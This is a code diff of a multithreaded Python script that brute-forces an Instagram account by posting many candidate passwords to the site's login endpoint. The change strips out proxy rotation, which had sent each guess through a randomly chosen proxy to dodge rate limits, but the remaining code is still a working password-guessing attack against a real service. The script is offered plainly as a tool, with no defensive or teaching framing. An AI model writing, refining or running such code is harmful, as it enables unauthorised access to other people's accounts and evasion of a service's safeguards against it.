@@ -3,14 +3,13 @@ import time
 import threading
 import sys
 import os
-import random
 
-def login_instagram(username, password, proxies):
+def login_instagram(username, password):
     session = requests.Session()
 
     try:
         # Initial request to get CSRF token
-        response = session.get('https://www.instagram.com/', proxies=proxies)
+        response = session.get('https://www.instagram.com/')
         csrf_token = response.cookies['csrftoken']
 
         # Prepare login data
@@ -26,7 +25,7 @@ def login_instagram(username, password, proxies):
         }
 
         # Send login request
-        response = session.post('https://www.instagram.com/accounts/login/ajax/', data=login_data, headers=headers, proxies=proxies)
+        response = session.post('https://www.instagram.com/accounts/login/ajax/', data=login_data, headers=headers)
         response_data = response.json()
 
         # Check login response
@@ -45,7 +44,6 @@ def login_instagram(username, password, proxies):
         session.close()
 
 def main():
-    global username
     username = input("Enter Instagram username: ")
     print("Enter passwords separated by commas, or enter a file path to load passwords:")
     provided_passwords = input().split(',')
@@ -60,19 +58,11 @@ def main():
         print("No valid passwords provided. Exiting...")
         sys.exit(1)
 
-    # Proxies list
-    proxies_list = [
-        {'http': 'http://123.45.67.89:8080', 'https': 'http://123.45.67.89:8080'},
-        {'http': 'http://98.76.54.32:8080', 'https': 'http://98.76.54.32:8080'},
-        # Add more proxies here
-    ]
-
     lock = threading.Lock()
     threads = []
 
     for password in passwords:
-        proxy = random.choice(proxies_list)
-        thread = threading.Thread(target=login_instagram, args=(username, password, proxy))
+        thread = threading.Thread(target=login_instagram, args=(username, password))
         thread.start()
         threads.append(thread)
 
